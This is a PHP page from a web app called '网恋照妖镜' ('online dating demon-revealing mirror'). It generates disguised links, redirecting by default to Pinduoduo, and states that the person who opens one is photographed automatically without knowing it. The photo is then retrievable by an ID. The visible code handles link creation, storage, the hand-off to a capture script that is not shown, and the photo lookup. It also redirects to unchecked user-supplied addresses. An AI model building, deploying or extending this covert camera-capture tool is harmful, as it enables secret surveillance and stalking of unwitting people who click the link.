<?php
/**
 * Online-Mirror 升级版 - 主页面
 * 支持双重模式：链接生成器 & 拍照入口
 */
session_start();
require_once __DIR__ . '/config.php';

// ========== 拍照模式：当传入 id&url 时跳转到 capture.php ==========
if (isset($_GET['id']) && isset($_GET['url'])) {
    $id = trim($_GET['id']);
    $url = trim($_GET['url']);
    if (!empty($id) && !empty($url)) {
        header('Location: capture.php?id=' . urlencode($id) . '&url=' . urlencode($url));
        exit;
    }
}

// 处理生成链接请求
$generated_link = '';
$generated_id = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'generate') {
    $redirect_url = trim($_POST['redirect_url'] ?? 'https://mobile.yangkeduo.com/');
    $expire_days = intval($_POST['expire_days'] ?? 7);
    $user_id = isLoggedIn() ? $_SESSION['user_id'] : null;
    
    // 生成唯一ID（确保不重复）
    do {
        $link_id = generateID(6);
        $db = getDB();
        $stmt = $db->prepare("SELECT COUNT(*) FROM links WHERE link_id = ?");
        $stmt->execute([$link_id]);
    } while ($stmt->fetchColumn() > 0);
    
    // 计算过期时间
    $expires_at = date('Y-m-d H:i:s', strtotime("+{$expire_days} days"));
    
    // 入库
    $stmt = $db->prepare("INSERT INTO links (link_id, redirect_url, user_id, expires_at) VALUES (?, ?, ?, ?)");
    $stmt->execute([$link_id, $redirect_url, $user_id, $expires_at]);
    
    $generated_id = $link_id;
    $generated_link = SITE_URL . 'index.php?id=' . $link_id . '&url=' . urlencode($redirect_url);
    
    addLog($link_id, 'generate');
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Online Mirror</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
    min-height: 100vh;
    color: #e0e0e0;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}
.container {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 24px;
    padding: 40px;
    max-width: 580px;
    width: 100%;
    box-shadow: 0 25px 50px rgba(0,0,0,0.5);
}
.logo {
    text-align: center;
    margin-bottom: 30px;
}
.logo i {
    font-size: 48px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.logo h1 {
    font-size: 28px;
    margin-top: 10px;
    background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.logo p {
    color: #a0a0b8;
    font-size: 14px;
    margin-top: 6px;
}
.form-group {
    margin-bottom: 18px;
}
.form-group label {
    display: block;
    font-size: 14px;
    color: #b0b0c8;
    margin-bottom: 6px;
    font-weight: 500;
}
.form-group label i {
    margin-right: 6px;
    width: 18px;
}
.form-group input, .form-group select {
    width: 100%;
    padding: 12px 16px;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 12px;
    background: rgba(255,255,255,0.06);
    color: #e0e0e0;
    font-size: 15px;
    transition: all 0.3s;
    outline: none;
}
.form-group input:focus, .form-group select:focus {
    border-color: #667eea;
    box-shadow: 0 0 0 3px rgba(102,126,234,0.2);
    background: rgba(255,255,255,0.08);
}
.form-group select option { background: #1a1a2e; color: #e0e0e0; }
.btn-generate {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 12px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}
.btn-generate:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 25px rgba(102,126,234,0.4);
}
.btn-generate:active { transform: translateY(0); }

/* 结果区域 */
.result-box {
    margin-top: 24px;
    padding: 20px;
    background: rgba(255,255,255,0.05);
    border-radius: 16px;
    border: 1px solid rgba(255,255,255,0.08);
    display: <?php echo $generated_link ? 'block' : 'none'; ?>;
}
.result-box h3 {
    font-size: 14px;
    color: #a0a0b8;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    gap: 6px;
}
.result-box .link-display {
    display: flex;
    gap: 8px;
}
.result-box .link-display input {
    flex: 1;
    padding: 10px 14px;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 10px;
    background: rgba(0,0,0,0.3);
    color: #c0c0d8;
    font-size: 13px;
    word-break: break-all;
    outline: none;
}
.result-box .link-display button {
    padding: 10px 16px;
    border: none;
    border-radius: 10px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    cursor: pointer;
    font-size: 14px;
    transition: all 0.3s;
    white-space: nowrap;
}
.result-box .link-display button:hover { opacity: 0.85; }
.result-box .tips {
    margin-top: 12px;
    padding: 12px;
    background: rgba(255,200,0,0.08);
    border: 1px solid rgba(255,200,0,0.15);
    border-radius: 10px;
    font-size: 13px;
    color: #d0b84a;
    line-height: 1.6;
}
.result-box .tips strong { color: #f0d060; }

/* 页脚 */
.footer {
    margin-top: 24px;
    text-align: center;
    font-size: 13px;
    color: #606080;
}
.footer a {
    color: #667eea;
    text-decoration: none;
}
.footer a:hover { text-decoration: underline; }
.footer .divider { margin: 0 8px; color: #404060; }

/* Toast */
.toast {
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%) translateY(-100px);
    padding: 12px 24px;
    border-radius: 12px;
    background: rgba(0,0,0,0.85);
    color: white;
    font-size: 14px;
    transition: transform 0.4s ease;
    z-index: 999;
    pointer-events: none;
}
.toast.show { transform: translateX(-50%) translateY(0); }
.toast.success { background: rgba(0,200,80,0.9); }

@media (max-width: 480px) {
    .container { padding: 24px 16px; }
    .logo h1 { font-size: 22px; }
}
</style>
</head>
<body>
<div class="toast" id="toast"></div>

<div class="container">
    <div class="logo">
        <i class="fas fa-camera"></i>
        <h1>网恋照妖镜</h1>
        <p>是小姐姐，还是网图哥？</p>
    </div>

    <form method="POST" onsubmit="return validateForm()">
        <input type="hidden" name="action" value="generate">
        
        <div class="form-group">
            <label><i class="fas fa-link"></i> 跳转地址</label>
            <input type="url" name="redirect_url" id="redirect_url" value="https://mobile.yangkeduo.com/" placeholder="https://example.com" required>
        </div>

        <div class="form-group">
            <label><i class="fas fa-clock"></i> 链接有效期</label>
            <select name="expire_days">
                <option value="1">1 天</option>
                <option value="3">3 天</option>
                <option value="7" selected>7 天</option>
                <option value="14">14 天</option>
                <option value="30">30 天</option>
            </select>
        </div>

        <button type="submit" class="btn-generate">
            <i class="fas fa-magic"></i> 生成镜像链接
        </button>
    </form>

    <div class="result-box" id="resultBox">
        <h3><i class="fas fa-check-circle" style="color:#4caf50;"></i> 镜像链接已生成</h3>
        <div class="link-display">
            <input type="text" id="generatedLink" value="<?php echo htmlspecialchars($generated_link); ?>" readonly>
            <button onclick="copyLink()"><i class="fas fa-copy"></i> 复制</button>
        </div>
        <div class="tips">
            <strong>⚠️ 温馨提示：</strong><br>
            ID: <code><?php echo htmlspecialchars($generated_id); ?></code>
            <button onclick="copyID()" style="margin-left:6px;padding:2px 10px;border:none;border-radius:6px;background:rgba(102,126,234,0.3);color:#667eea;cursor:pointer;font-size:12px;"><i class="fas fa-copy"></i> 复制ID</button>
            — 用此ID可在后台查看照片<br>
            对方打开链接后会自动拍摄一张照片并跳转到指定页面
            <?php if (isLoggedIn()): ?>
                <br><a href="dashboard.php" style="color:#667eea;">👉 前往后台管理</a>
            <?php endif; ?>
        </div>
    </div>

    <!-- 快速查看照片 -->
    <div style="margin-top:20px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.06);">
        <form action="photos.php" method="GET" style="display:flex;gap:8px;align-items:center;">
            <label style="font-size:13px;color:#8080a0;white-space:nowrap;"><i class="fas fa-search"></i> 查照片</label>
            <input type="text" name="id" placeholder="输入ID查看照片" style="flex:1;padding:10px 14px;border:1px solid rgba(255,255,255,0.12);border-radius:10px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:14px;outline:none;">
            <button type="submit" style="padding:10px 16px;border:none;border-radius:10px;background:rgba(102,126,234,0.2);color:#667eea;cursor:pointer;font-size:14px;"><i class="fas fa-arrow-right"></i></button>
        </form>
    </div>

    <div class="footer">
        <?php if (isLoggedIn()): ?>
            <i class="fas fa-user"></i> <?php echo htmlspecialchars($_SESSION['username']); ?>
            <span class="divider">|</span>
            <a href="dashboard.php"><i class="fas fa-tachometer-alt"></i> 控制台</a>
            <span class="divider">|</span>
            <a href="login.php?action=logout"><i class="fas fa-sign-out-alt"></i> 退出</a>
        <?php else: ?>
            <a href="login.php"><i class="fas fa-lock"></i> 管理员登录</a>
        <?php endif; ?>
    </div>
</div>

<script>
function validateForm() {
    const url = document.getElementById('redirect_url').value.trim();
    if (!url) {
        showToast('请输入跳转地址！', false);
        return false;
    }
    return true;
}

function copyID() {
    const id = '<?php echo htmlspecialchars($generated_id); ?>';
    navigator.clipboard.writeText(id).then(() => {
        showToast('✅ ID 已复制！', true);
    }).catch(() => {
        showToast('复制失败，请手动选中复制', false);
    });
}

function copyLink() {
    const input = document.getElementById('generatedLink');
    input.select();
    input.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(input.value).then(() => {
        showToast('✅ 链接已复制到剪贴板！', true);
    }).catch(() => {
        document.execCommand('copy');
        showToast('✅ 已复制！', true);
    });
}

function showToast(msg, success) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.className = 'toast' + (success ? ' success' : '');
    setTimeout(() => t.classList.add('show'), 10);
    setTimeout(() => t.classList.remove('show'), 2500);
}

// 如果已有生成的链接，自动展示结果
<?php if ($generated_link): ?>
document.getElementById('resultBox').style.display = 'block';
<?php endif; ?>

// 预先清空表单的redirect_url字段
</script>
</body>
</html>
